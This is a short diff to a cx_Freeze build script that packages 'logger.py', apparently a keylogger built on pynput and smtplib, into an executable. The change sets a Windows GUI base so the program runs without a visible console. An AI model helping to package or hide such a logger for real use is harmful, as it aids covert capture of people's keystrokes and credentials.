@@ -1,7 +1,13 @@
 from cx_Freeze import setup, Executable
+import sys
 
 base = None
 
+if (sys.platform == "win32"):
+
+    base = "Win32GUI"
+
+    
 executables = [Executable("logger.py", base=base)]
 
 packages = ["idna", "pynput", "threading", "smtplib", "time"]
